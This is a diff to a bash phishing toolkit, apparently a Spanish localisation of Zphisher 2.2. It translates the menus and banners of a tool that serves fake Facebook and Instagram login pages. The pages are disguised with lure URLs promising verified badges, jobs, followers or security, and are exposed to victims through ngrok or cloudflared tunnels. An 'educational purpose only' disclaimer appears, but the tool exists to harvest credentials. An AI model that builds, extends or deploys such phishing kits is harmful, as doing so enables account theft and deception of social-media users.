@@ -153,12 +153,12 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE} ______      _     _                    
+		${ORANGE}|___  /     | |   (_)    _             
+		${ORANGE}   / / _ __ | |__  _ ___| |__  ___
+		${ORANGE}  / / | '_ \| '_ \| / __| '_ \/_  |
+		${ORANGE} / /__| |_) | | | | \__ \ | | | | |  
+		${ORANGE}/_____| .__/|_| |_|_|___/_| |_| |_|   
 		${ORANGE}      | |                                
 		${ORANGE}      |_|                ${RED}Version : 2.2
 
@@ -170,9 +170,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░██░██
+		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█░▀░█
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░░░▀ ${WHITE} 2.2
 	EOF
 }
 
@@ -295,7 +295,7 @@ install_cloudflared() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Gracias por usar esta herramienta. Ten un buen dia.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -312,23 +312,23 @@ about() {
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
 
 		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
-		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
+		${CYAN}Esta herramienta es para propositos educacionales ${RED}!${WHITE}
+		${CYAN}El autor no se hace responsable de esta herramienta ${RED}!${WHITE}
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Menu principal ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecciona una opcion: ${BLUE}"
 
 	case $REPLY in 
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Regresando a menu principal..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcion invalida, Trata de nuevo..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -450,17 +450,17 @@ tunnel_menu() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione un servicio de reenvío de puerto: ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
-			start_localhost;;
+			empezar_localhost;;
 		2 | 02)
-			start_ngrok;;
+			empezar_ngrok;;
 		3 | 03)
-			start_cloudflared;;
+			empezar_cloudflared;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcion invalida, Trata de nuevo..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -469,34 +469,34 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Avanzada herramienta de vacantes de trabajo
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de inicio de sesión de seguridad falsa
+		${RED}[${WHITE}04${RED}]${ORANGE} Página de inicio sesión de Facebook Messenger
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecciona una opcion: ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://insignia-azul-verificada-para-facebook-gratis'
 			tunnel_menu;;
 		2 | 02)
-			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			website="fb_Vacantes"
+			mask='http://Postulate-en-los-mejores-empleos'
 			tunnel_menu;;
 		3 | 03)
-			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			website="fb_seguridad"
+			mask='http://haz-tu-facebook-asegurado-y-libre-de-hackers'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='http://obtener-messenger-premium-gratis'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcion invalida, Trata de nuevo..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -505,14 +505,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de inicio de autoseguidores automáticas(femenino)
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de inicio de sesión de 1000 seguidores
+		${RED}[${WHITE}04${RED}]${ORANGE} Insignia azul Verificar página de inicio de sesión
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecciona una opcion: ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
